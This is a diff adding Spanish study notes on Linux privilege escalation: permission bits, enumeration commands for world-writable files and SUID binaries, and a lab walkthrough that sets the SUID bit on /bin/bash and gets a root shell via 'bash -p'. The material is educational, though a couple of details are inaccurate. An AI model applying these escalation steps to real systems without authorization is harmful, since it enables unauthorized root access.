@@ -1,0 +1,59 @@
+Escalación de privilegios Linux
+
+--------------------------------------------------------------
+
+Teoría Inicial - Permisos
+r (Read) = Permiso de lectura
+w (Write) = Permiso de escritura
+x (Exectute) = Permiso de ejecución
+
+Teoría Inicial - Clasificación de usuarios
+U (User) = (e.g root, john, jack)
+G (Group) = (e.g admin, teachers, docker)
+O (Other) = (Otro tipo de usuario o grupo)
+
+-rw-rw---- 1 teacher admin      12 Apr  6 22:27 guidelines
+-r--r----- 1 student admin      10 Apr  6 22:27 readme.txt
+
+--------------------------------------------------------------
+
+Permiso de archivo
+En los archivos revisar que usuarios pueden leer basado en los permisos de grupos.
+Comando: cat /etc/groups
+
+Crear archivos executables con permisos del usuario loggeado
+Comando: chmod +x shell
+
+Revisar los archivos con permisos de lectura
+Comando: find / -perm -o+r
+
+Revisar los archivos con permisos de escritura
+Comando: find / -perm -o+w
+
+Buscar todos los binarios con setuid bit set (TIP ADICIONAL: Revisar https://gtfobins.github.io/ por cada binario)
+Comando: find / -perm -4000
+
+Ejemplo de escalación
+1- Revisar los permisos de /bin/bash - Comando: ls -l /bin/bash
+2- Establecer bit setuid - Comando: chmod u+s /bin/bash
+3- Revisar que el setuid a sido establecido - Comando: ls -l /bin/bash
+4- Cambiar el usuario con "su" - Comando: su student -> whoami (Revisar el id de usuario (student))
+5- Escalar privilegios - Comando: bash -p
+
+root@hannibal:/work# ls -l /bin/bash
+-rwsr-xr-x 1 root root 1166912 May  3  2019 /bin/bash
+root@attackdefense:/work# su student
+$ id
+uid=999(student) gid=999(student) groups=999(student)
+$ whoami
+student
+$ bash -p
+bash-5.0# id
+uid=999(student) gid=999(student) euid=0(root) groups=999(student)
+bash-5.0# whoami
+root
+
+
+
+
+MAS INFORMACIÓN: https://gist.github.com/juanarbol/c44e736be70279c1fd5d68aa24f9d8be
